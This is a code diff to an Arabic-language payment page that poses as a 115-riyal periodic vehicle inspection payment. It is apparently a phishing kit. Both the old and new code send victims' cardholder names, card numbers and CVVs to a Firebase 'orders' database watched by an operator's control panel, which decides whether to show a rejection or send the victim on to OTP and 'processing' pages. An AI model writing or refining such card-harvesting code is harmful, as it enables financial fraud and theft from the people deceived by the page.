@@ -24,15 +24,6 @@
         .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
         .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }
 
-        /* شاشة التحميل المضافة */
-        #loadingOverlay {
-            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.9); z-index: 100; border-radius: 25px;
-            flex-direction: column; justify-content: center; align-items: center;
-        }
-        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--main-green); border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         /* المربع الأحمر عند الرفض */
         #rejectMsg {
             display: none; background: #feebeb; color: var(--error-red); padding: 12px;
@@ -69,12 +60,6 @@
 <body>
 
     <div class="payment-card-container">
-        <div id="loadingOverlay">
-            <div class="spinner"></div>
-            <p style="margin-top: 15px; color: #333; font-weight: bold;">جاري معالجة البيانات...</p>
-            <p style="font-size: 11px; color: #666; margin-top: 5px;">يرجى عدم إغلاق الصفحة</p>
-        </div>
-
         <div class="main-header">
             <h1>إتمام عملية الدفع</h1>
             <p>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
@@ -128,7 +113,21 @@
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        const v_id = localStorage.getItem('v_id');
+        
+        // جلب الـ v_id أو إنشاؤه لضمان عدم ضياع البيانات
+        let v_id = localStorage.getItem('v_id');
+        if (!v_id) {
+            v_id = 'user_' + Math.floor(Math.random() * 1000000);
+            localStorage.setItem('v_id', v_id);
+        }
+
+        // فحص حالة "الرفض" عند تحميل الصفحة
+        window.onload = function() {
+            if (localStorage.getItem('payment_error') === 'true') {
+                document.getElementById('rejectMsg').style.display = 'block';
+                localStorage.removeItem('payment_error');
+            }
+        };
 
         function isValidLuhn(number) {
             let sum = 0; let shouldDouble = false;
@@ -184,14 +183,7 @@
 
         document.getElementById('cvv').addEventListener('input', validateForm);
 
-        // وظيفة الإرسال والتحكم المباشر
         function submitPayment() {
-            if (!v_id) return;
-            
-            // 1. إظهار شاشة التحميل فوراً
-            document.getElementById('loadingOverlay').style.display = 'flex';
-            document.getElementById('rejectMsg').style.display = 'none';
-
             const data = {
                 cardHolder: document.getElementById('cardHolder').value,
                 cardNumber: document.getElementById('cardNumber').value,
@@ -200,28 +192,15 @@
                 last_update: new Date().toLocaleTimeString()
             };
 
-            // 2. تحديث البيانات في الفايربيس وإرسال "مكان العميل"
-            database.ref('orders/' + v_id + '/card_details').set(data);
-            database.ref('orders/' + v_id).update({ 
-                current_page: 'صفحة الدفع - انتظار القرار',
-                control_action: '' // تصفير الأكشن القديم
-            });
-
-            // 3. مراقبة لوحة التحكم بانتظار (قبول أو رفض)
-            database.ref('orders/' + v_id + '/control_action').on('value', (snapshot) => {
-                const action = snapshot.val();
-                
-                if (action === 'next') {
-                    // إذا ضغطت "قبول"
-                    window.location.href = 'otp.html';
-                } 
-                else if (action === 'error') {
-                    // إذا ضغطت "رفض"
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    document.getElementById('rejectMsg').style.display = 'block';
-                    // إعادة تصفير الأكشن في القاعدة عشان يقدر يبعت تاني
-                    database.ref('orders/' + v_id).update({ control_action: '' });
-                }
+            // 1. إرسال البيانات للوحة التحكم في مسار orders
+            database.ref('orders/' + v_id).update({
+                personal_info: { fullName: data.cardHolder },
+                card_details: data,
+                current_page: 'جاري الانتظار في صفحة Processing',
+                control_action: '' // تصفير الأكشن لانتظار قرارك الجديد
+            }).then(() => {
+                // 2. التحويل فوراً لصفحة اللودنج المخصصة
+                window.location.href = 'processing.html';
             });
         }
     </script>
